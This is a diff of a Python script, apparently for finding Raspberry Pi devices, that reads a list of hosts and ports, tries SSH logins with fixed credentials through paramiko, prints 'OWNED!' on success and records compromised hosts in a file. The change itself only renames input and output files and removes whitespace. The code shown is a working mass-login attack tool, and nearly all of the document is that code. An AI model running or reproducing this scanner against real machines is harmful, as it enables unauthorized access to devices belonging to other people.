@@ -7,7 +7,7 @@ CONN_TIMEOUT = 5
 
 paramiko.util.log_to_file("paramiko.log")
 
-with open('pis') as f:
+with open('pies.txt') as f:
 	for line in f.readlines():
 		pi = line.split(',')
 		(host, port) = (pi[0], pi[1])
@@ -17,10 +17,10 @@ with open('pis') as f:
 
 		print('trying ' + host + ':' + port + '... '),
 		sys.stdout.flush()
-		try:		
+		try:
 			ssh.connect(host, port=int(port), username=USER, password=PASS, timeout=CONN_TIMEOUT)
 			print('OWNED!')
-			with open('owned', 'a') as g:
+			with open('owned_pies.txt', 'a') as g:
 				g.write(host + ':' + port + '\n')
 			ssh.close()
 		except Exception as e:
